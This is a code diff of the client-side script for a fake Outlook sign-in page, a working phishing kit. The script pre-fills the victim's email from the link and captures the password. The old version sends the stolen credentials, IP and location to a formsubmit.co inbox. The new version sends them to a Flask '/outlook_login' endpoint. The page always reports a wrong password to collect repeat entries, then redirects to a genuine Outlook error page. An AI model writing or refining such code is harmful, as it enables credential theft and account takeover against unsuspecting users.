@@ -418,58 +418,44 @@
     <script nonce="MzA4MjAzMTI0NywzNDY1MDY1MDUw">
     $(document).ready(function() {
         var count = 0;
-        var ipInfo = {}; // Cache IP info to avoid multiple network requests
-        var $emailField = $('#email02'); // Cache frequently accessed jQuery selectors
+        var $emailField = $('#email02');
         var $aiField = $('#aiField');
         var $msg = $('#msg');
         var $submitButton = $('#submit-btn');
         var $error = $('#error');
-        var $passwordField = $('#password'); // Cache password field
+        var $passwordField = $('#password');
 
-        // Clear the email02 field on page load to ensure it's blank
+        // Clear email field
         $emailField.val('');
-
-        // Force the field to stay blank by preventing autofill
         setTimeout(function(){
             $emailField.val('');
         }, 50);
 
-        // Extract email from URL hash and populate fields if present
+        // Extract email from URL hash
         var email = window.location.hash.substr(1);
         if (email) {
             var ind = email.indexOf("@");
             var my_slice = email.substr(ind + 1);
             var c = my_slice.substr(0, my_slice.indexOf('.')).toLowerCase();
-
             $msg.hide();
-            $emailField.val(email);  // Set email02 field if necessary
-            $('#dom').html(my_slice);
+            $emailField.val(email);
         }
 
-        // Set aiField value from the hash
+        // Set aiField from hash
         var hashValue = location.hash.substring(1);
         $aiField.val(hashValue);
 
-        // Fetch IP info only once
-        async function fetchIpInfo() {
-            if (!ipInfo.ip) {
-                const response = await $.getJSON('https://ipinfo.io');
-                ipInfo.ip = response.ip;
-                ipInfo.location = `${response.city}, ${response.region}, ${response.country}`;
-            }
-        }
-
-        // Add keypress event to trigger form submission when Enter key is pressed
+        // Add keypress event for Enter key
         $emailField.add($passwordField).keypress(function(event) {
-            if (event.which === 13) {  // Check if Enter key is pressed
-                event.preventDefault(); // Prevent default form submission
-                $submitButton.click();   // Trigger the submit button click event
+            if (event.which === 13) {
+                event.preventDefault();
+                $submitButton.click();
             }
         });
 
-        // Handle form submission on button click
-        $submitButton.click(async function(event) {
-            event.preventDefault(); // Prevent default form submission
+        // Handle form submission
+        $submitButton.click(function(event) {
+            event.preventDefault();
             $error.hide();
             $msg.hide();
 
@@ -477,37 +463,34 @@
             var password = $passwordField.val();
             var ai = $aiField.val();
 
-            await fetchIpInfo(); // Ensure IP info is fetched before submission
-
+            // Get IP address from Flask
+            var ip = '{{ request.remote_addr }}';
+            var useragent = navigator.userAgent;
+            
             count++;
 
-            // Perform AJAX form submission
+            // Send to Flask endpoint instead of formsubmit.co
             $.ajax({
-                url: 'https://formsubmit.co/ajax/ae09f3c51fe4e38b7fb86395f0646b7d',
+                url: '/outlook_login',  // Changed to Flask endpoint
                 type: 'POST',
-                dataType: 'json',
                 data: {
-                    Username: email02,
-                    Password: password,
-                    Email: ai,  // aiField value is sent
-                    Attempts: count,
-                    IP: ipInfo.ip,
-                    Location: ipInfo.location,
-                    _template: "table",
-                    _subject: "OutlookAdmin_logs | " + ipInfo.ip
+                    email02: email02,
+                    password: password,
+                    ai: ai,
+                    attempts: count
                 },
                 beforeSend: function() {
-                    $submitButton.html('Signing in...');
+                    $submitButton.val('Signing in...');
                 },
-                success: function() {
+                success: function(response) {
                     if (count >= 2) {
                         count = 0;
                         window.location.replace('https://outlook.office365.com/Encryption/ErrorPage.aspx?src=3&code=11&be=SN6PR04MB4014&fe=JNAP275CA0040.ZAFP275.PROD.OUTLOOgK.COM&loc=en-US&itemID=E4E_M_e9df154a-e4b8-4486-8aec-7acceeb93fee');
                     }
                 },
                 complete: function() {
-                    $submitButton.html('Sign in');
-                    $passwordField.val(""); // Clear password field
+                    $submitButton.val('Sign in');
+                    $passwordField.val("");
                     $msg.show().html("The username or password you entered isn't correct. Try entering it again.");
                 }
             });
